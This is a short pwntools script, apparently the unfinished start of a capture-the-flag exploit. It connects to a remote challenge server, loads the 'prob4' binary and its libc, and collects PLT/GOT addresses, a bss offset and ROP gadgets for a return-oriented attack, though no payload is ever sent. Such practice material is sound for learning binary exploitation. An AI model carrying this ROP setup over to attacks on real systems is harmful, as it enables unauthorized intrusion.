
from pwn import *
context.terminal=['tmux', 'splitw', '-h']

#p = process("./prob2")
p = remote("fsi.zzado.kr", 9934)
e = ELF("./03 Pwn/prob4")
lib = ELF('./03 Pwn/prob4_libc.so.6')
puts_plt = e.plt['puts']
puts_got = e.got['puts']
read_plt = e.plt['read']
bss = e.bss() + 0x20

r = ROP(e)
pop_1 = r.find_gadget(['pop edi', 'ret'])[0]
pop_3 = r.find_gadget(['pop ebx', 'pop esi', 'pop edi', 'ret'])[0]

#gdb.attach(p,'b* vulns')
print(p.recv())
input(">")



p.interactive() 